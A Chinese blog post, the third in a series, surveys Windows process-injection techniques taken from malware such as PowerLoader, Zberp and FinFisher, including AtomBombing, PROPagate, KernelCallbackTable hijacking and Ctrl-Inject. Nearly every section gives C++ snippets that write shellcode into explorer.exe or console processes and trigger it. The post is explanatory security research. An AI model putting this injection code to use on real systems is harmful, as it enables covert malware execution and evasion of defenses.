---
title: Windows进程注入技术总结(三)
author: iaB
categories:
- Windows
tags: 
- Inject 
date: 2021-05-14 07:30:00
excerpt: 前两次得文章已经介绍过了部分进程注入得写入和执行得方法,随着时间继续推移,在研究人员与恶意代码得对抗过程中又产生了许多新得方式.
---

# 概述  
之前已经介绍过一些方法,像WriteProcessMemory,CreateRemoteThread+Loadlibrary,CreateRemoteThread+payload,NtQueueApcThread,SetWindowsHookEx这类比较简单易用的,又有Ghost-Writing这种又稍显复杂.这篇我们继续介绍一些在之后的研究,研究员们从恶意代码中发现的又或是自己发现的一些新的方式.  
### Extra Window Bytes  
这种方法被发现于一款名为PowerLoader的恶意代码当中,它通过劫持一些特定窗口类的虚函数表,目的时修改表中的回调函数,所以使用这种方法前,需要对目标进程有充分的了解才.这里的示例使用的是explorer.exe,窗口类名为Shell_TrayWnd,通过伪造CTray对象来实现目的  
> a. 可以使用任意的认为合适的写方法将shellcode写入到目标进程当中.  
> b. 再将我们设计好的CTray对象写入到目标进程当中  
> c. 使用SetWindowLongPtr去修改窗口0字节处所指向的对象(本质上是一个虚表),指向我们所写入的CTray结构  
> d. 使用SendNotifyMessageA去触发消息循环调用窗口回调函数  
```cpp  
HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
DWORD process_id;
GetWindowThreadProcessId(hWindow, &process_id); DWORD64 old_obj = GetWindowLongPtrA(hWindow, 0);
HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, process_id);
LPVOID target_payload = VirtualAllocEx(h, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(h, target_payload, payload, sizeof(payload), NULL);
DWORD64 new_obj[2];
LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(new_obj), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
new_obj[0] = (DWORD64)target_obj + sizeof(DWORD64);
new_obj[1] = (DWORD64)target_payload;
WriteProcessMemory(h, target_obj, obj, sizeof(new_obj), NULL);
SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
SendNotifyMessageA(hWindow, WM_PAINT, 0, 0); Sleep(1); SetWindowLongPtrA(hWindow, 0, old_obj);
```  
我们最好是要提前利用GetWindowLongPtrA去保存原有的对象地址,方便我们在触发执行shellcode后恢复原来的环境.  
### Shared Memory  
刚刚介绍的是PowerLoader的执行方法,现在介绍它使用的写方法.它利用了Explorer程序中已经创建的section对象,将其直接映射到自身的进程当中进行读写.  

> a. 利用OpenFileMapping打开Explorer中的Map内存,并映射到当前进程当中  
> b. 将shellocode拷贝进内存当中  
> c. 使用VirtualQueryEx去遍历目标进程的内存地址,为的是找到shellcode在目标进程中的地址  
> d. 使用寻找到的地址利用执行方法去执行shellcode  
```cpp  
HANDLE hm = OpenFileMapping(FILE_MAP_ALL_ACCESS,FALSE,section_name);
BYTE* buf = (BYTE*)MapViewOfFile(hm, FILE_MAP_ALL_ACCESS, 0, 0, section_size);
memcpy(buf+section_size-sizeof(payload), payload, sizeof(payload));
HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
char* read_buf = new char[sizeof(payload)];
SIZE_T region_size;
for (DWORD64 address = 0; address < 0x00007fffffff0000ull; address += region_size)
{
MEMORY_BASIC_INFORMATION mem;
SIZE_T buffer_size = VirtualQueryEx(h, (LPCVOID)address, &mem, sizeof(mem));
if ((mem.Type == MEM_MAPPED) && (mem.State == MEM_COMMIT) && (mem.Protect == PAGE_READWRITE) && (mem.RegionSize == section_size))
{
ReadProcessMemory(h, (LPCVOID)(address+section_size-sizeof(payload)), read_buf, sizeof(payload), NULL);
if (memcmp(read_buf, payload, sizeof(payload)) == 0)
{
// the payload is at address + section_size - sizeof(payload);
…
break;
}
}
region_size = mem.RegionSize;
}
```  
得到里目标进程当中payload的地址,就可以使用任意一种执行方法去执行.同样,想要使用这种方法需要提前对目标进程有足够的了解.Explorer当中除了示例当中使用的以外还有  
"\BaseNamedObjects\ShimSharedMemory"  
"\BaseNamedObjects\windows_shell_global_counters"  
"\BaseNamedObjects\MSCTF.Shared.SFM.MIH"  
"\BaseNamedObjects\MSCTF.Shared.SFM.AMF"  
"\BaseNamedObjects\UrlZonesSM_Administrator"  
"\BaseNamedObjects\UrlZonesSM_SYSTEM"  
### Desktop Heap  
这种方法是发现于PowerLoaderEx,看名字就知道跟上面的PowerLoader是什么关系了吧.这种方法是基于 DesktopHeap被共享于所有带有窗口的进程当中.所以我们可以将数据写入DesktopHeap中.跟上面的方法大同小异只是利用的对象不一样,当然查询内存的部分也就有所不同.因为这种方法在Win10当中已经不能使用,所以学习的文章当中并没有给出一个简洁的示例代码,感兴趣可参考 https://github.com/BreakingMalware/PowerLoaderEx/blob/master/PowerLoaderEx.cpp  
### AtomBombing  
被Tal Liberman发明于2016年,当时号称能够绕过所有安全软件.这种方法利用GlobalAddAtom去实现进程间的数据传递.GlobalAddAtom向全局原子表中添加一个字符串,并返回一个唯一的值来标识字符串。这个表可以被系统上的所有进程访问.GlobalGetAtomName通过指定的标识来获取对应的字符串写入指定的位置.因为GlobalGetAtomName拥有三个参数,所以可以使用NtQueueApcThread来进行APC调用.但是要注意目标进程必须有警醒状态才行.  
> a. 将payload分割成以零结尾的字符串  
> b. 为每一个字符串创建Atom  
> c. 使用返回的标识,利用NtQueueApcThread来写入目标进程的指定位置  
```cpp  
HANDLE th = OpenThread(THREAD_SET_CONTEXT| THREAD_QUERY_INFORMATION, FALSE, thread_id);
ATOM aux = GlobalAddAtomA("b"); // arbitrary one char string
if (target_payload[0] == '\0')
{
printf("Invalid payload (starts with NUL)\n");
exit(0);
}
for (DWORD64 pos = sizeof(target_payload) - 1; pos > 0; pos--)
{
if ((payload[pos] == '\0') && (payload[pos - 1] == '\0'))
{
ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)aux, (PVOID)(((DWORD64)target_payload) + pos-1), (PVOID)2);
}
}
for (char* pos = payload; pos < (payload + sizeof(payload)); pos += strlen(pos)+1)
{
if (*pos == '\0')
{
continue;
}
ATOM a = GlobalAddAtomA(pos);
DWORD64 offset = pos - payload;
ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)a, (PVOID)(((DWORD64)target_payload) + offset), (PVOID)(strlen(pos)+1));
}
```  
### Forcibly map section  
这种方法发现于2017年的一款名为Zberp的恶意木马当中,它通过在自身的进程中创建一个filemaping然后映射到目标内存当中.  
> a. 创建一个filemapping  
> b. 映射到当前内存中  
> c. 将数据拷贝到mapped buffer当中  
> d. 使用NtMapViewOfSection将filemapping映射到目标进程当中  
```cpp  
HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);
LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, process_id);
memcpy(map_addr, payload, sizeof(payload)); 
LPVOID requested_target_payload=0;
SIZE_T view_size=0;
ntdll!NtMapViewOfSection(fm, p, &requested_target_payload, 0, sizeof(payload), NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE );
target_payload=requested_target_payload;
```  
### Unmap+Overwrite execution method  
这是Zberp当中使用的执行方式，其实一种劫持ntdll的方法.利用NtUnmapViewOfSection将目标进程当中ntdll的内存unmap掉,然后再在进程当中相同的位置申请同样大小的内存空间,将自己修改过的ntdll内容利用写方法写入到相应的位置.也可以利用上面map的方式直接将内存map进去.示例代码是针对Explorer进行注入.  
> a. 将目标进程当中的ntdll Unmap掉  
> b. 使用写方法将你patch过的dll重新填回相应的内存位置  
```cpp  
MODULEINFO ntdll_info;
HANDLE ntdll= GetModuleHandleA("ntdll");
GetModuleInformation(GetCurrentProcess(), ntdll , &ntdll_info, sizeof(ntdll_info));
HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, ntdll_info.SizeOfImage, NULL);
LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_SUSPEND_RESUME, FALSE, process_id);
ntdll!NtSuspendProcess(p);
ReadProcessMemory(p, ntdll, map_addr, ntdll_info.SizeOfImage, NULL);
// Patch NtClose in map_addr
ntdll!NtUnmapViewOfSection(p, ntdll);
SIZE_T view_size=0;
ntdll!NtMapViewOfSection(fm, p, &ntdll, 0, ntdll_info.SizeOfImage, NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE );
FlushInstructionCache(p, ntdll, ntdll_info.SizeOfImage);
ntdll!NtResumeProcess(p);
```  
### PROPagate execution method  
由Adam发明于2017年,在windwos界面程序中,窗口子类化的过程要先保存旧的回调,然后设置新的回调,在新的回调当中完成对消息的处理后再调用旧的回调.
当窗口子类化时,子窗口会多一个新的属性,根据comctl32.dll的版本来命名名称(版本6.x对应的名称是UxSubclassInfo；版本5.x对应的名称是CC32SubclassInfo)
保存着旧的回调函数指针。SetWindowSubclass中使用SetProp来设置这两个值.所以,可以使用这个函数来篡改回调函数指针.  
> a. 使用任意一种写方法将payload写入到目标进程当中  
> b. 找到目标进程的子窗口,并获取UxSubclassInfo属性  
> c. 从目标进程当中读出旧的结构  
> d. 复制并修改回调函数为payload地址  
> e. 将修改过的结构写入目标进程当中  
> f. 设置UxSubclassInfo为新写入的结构  
> g. 给目标窗口发送消息去触发执行  
```cpp  
HWND h = FindWindow("Shell_TrayWnd", NULL);
DWORD process_id;GetWindowThreadProcessId(h, &process_id);
HWND hst = GetDlgItem(h, 303); // System Tray
HWND hc = GetDlgItem(hst, 1504);
HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
char new_subclass[0x50];
HANDLE target_new_subclass = (HANDLE)VirtualAllocEx(p, NULL, sizeof(new_subclass), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
HANDLE old_subclass = GetProp(hc, "UxSubclassInfo");
ReadProcessMemory(p, (LPCVOID)old_subclass, (LPVOID)new_subclass, sizeof(new_subclass), NULL);
DWORD64 target_execution_ptr_value=target_execution;
memcpy(new_subclass + 0x18, &target_execution_ptr_value, sizeof(target_execution_ptr_value));
WriteProcessMemory(p, (LPVOID)(target_new_subclass), (LPVOID)new_subclass, sizeof(new_subclass), NULL); // Or any other write memory primitive
SetProp(hc, "UxSubclassInfo", target_new_subclass);
PostMessage(hc, WM_KEYDOWN, VK_NUMPAD1, 0);
Sleep(1);
SetProp(hc, "UxSubclassInfo", old_subclass);
```  

### KernelControlTable execution method  
这项技术最初被发现于2018年FinFisher恶意软件当中,他利用hook PEB中KernelCallbackTable中得 _fnCOPYDATA函数,再向目标窗口发送WM_COPYDATA消息来触发payload.这种方法必须要求目标进程拥有一个窗口,当然KernelControlTable里得其他函数如果找到合适得触发方式也是可以利用.  
> a. 将数据写入到目标进程当中  
> b. 获取目标进程的PEB,逐步找到KernelCallbacktable  
> c. 将__fnCOPYDATA的函数指针修改为payload后,将新的table写入到目标进程当中  
> d. 使用WM_COPYDATA去触发执行过程  
```cpp
HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION| PROCESS_VM_OPERATION| PROCESS_VM_READ| PROCESS_VM_WRITE, FALSE, process_id);
PROCESS_BASIC_INFORMATION pbi;
ntdll!NtQueryInformationProcess(p,ProcessBasicInformation, &pbi, sizeof(pbi),NULL);
PEB peb;
ReadProcessMemory(p, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
KERNELCALLBACKTABLE kct;
ReadProcessMemory(p, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
LPVOID target_payload = VirtualAllocEx(p, NULL, sizeof(payload),MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(p, target_payload, payload, sizeof(payload), NULL);
LPVOID target_kct = VirtualAllocEx(p, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
kct.__fnCOPYDATA = (ULONG_PTR)target_payload;
WriteProcessMemory(p, target_kct, &kct, sizeof(kct), NULL);
WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &target_kct, sizeof(ULONG_PTR), NULL);
COPYDATASTRUCT cds;
cds.dwData = 1;
wchar_t msg[] = L"foo";
cds.cbData = lstrlenW(msg) * 2;
cds.lpData = msg;
SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds); // hw can be obtained via e.g. EnumWindows
WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB,
KernelCallbackTable), &peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);
```  
### Ctrl-Inject execution method  
这种方法被Rotem Kerner发明于2018,这种方式必须被利用在控制台程序中,它基于控制台程序在处理Ctrl+C信号时,系统会在目标进程创建一个线程调用CtrlRoutine函数,该函数使用名为HandlerList的全局变量来存储回调函数列表,在该函数中会循环执行,直到其中一个处理程序返回TRUE(通知该信号已被处理)为止.我们将HandlerList当中的函数地址修改未payload的地址即可实现运行.  
> a. 将数据使用写方法写入到目标进程当中  
> b. 使用RtlEncodeRemotePointer将payload的指针加密  
> c. 将指针写入到HandlerList表当中  
> d. 向目标窗口发送Ctrl+C的信号触发执行  
```cpp  
HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE,process_id);
void* encoded_addr = NULL;
ntdll!RtlEncodeRemotePointer(h, target_execution, &encoded_addr);
WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL);
INPUT ip;
ip.type = INPUT_KEYBOARD;
ip.ki.wScan = 0;
ip.ki.time = 0;
ip.ki.dwExtraInfo = 0;
ip.ki.wVk = VK_CONTROL;
ip.ki.dwFlags = 0; // 0 for key press
SendInput(1, &ip, sizeof(INPUT));
Sleep(100);
PostMessageA(hWindow, WM_KEYDOWN, 'C', 0); 
Sleep(100); 
ip.type = INPUT_KEYBOARD; 
ip.ki.wScan = 0;
 ip.ki.time = 0;
 ip.ki.dwExtraInfo = 0; 
ip.ki.wVk = VK_CONTROL;
 ip.ki.dwFlags = KEYEVENTF_KEYUP; 
SendInput(1, &ip, sizeof(INPUT));
ntdll!RtlEncodeRemotePointer(h, kernelbase!DefaultHandler, &encoded_addr); 
WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL);
```  
上面的示例中没由显示如何找到HandlerList的.HandlerList是保存在kernelbase的空间中需要我们自己去寻找.我们可以通过函数SetConsoleCtrlHandle中去查找对SetCtrlHandler函数的调用(00007ffc2b62a761 e85a000000 call KERNELBASE!SetCtrlHandler (00007ffc2b62a7c0)),再从SetCtrlHandler当中去寻找HandlerListLength的调用(/00007ffc2b62a7cf 8b3d7bdb1a00 mov edi,dword ptr KERNELBASE!HandlerListLength (00007ffc2b7d8350)),HandlerListLength+8即是HandlerList的位置(x64)  
更详细的代码可以看https://github.com/theevilbit/injection/blob/master/Ctrlinject/Ctrlinject/Ctrlinject.cpp  

